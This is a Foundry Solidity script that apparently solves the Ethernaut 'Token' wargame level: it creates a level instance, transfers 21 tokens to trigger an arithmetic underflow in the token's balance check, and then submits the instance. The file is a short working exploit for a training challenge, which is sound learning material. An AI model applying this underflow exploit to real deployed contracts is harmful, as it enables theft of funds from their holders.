// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Token } from "src/Level05.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        Token instance = Token(instanceAddress);

        (,, address txOrigin) = vm.readCallers();
        console2.log(instance.balanceOf(txOrigin));
        instance.transfer(address(this), 21);
        console2.log(instance.balanceOf(txOrigin));

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
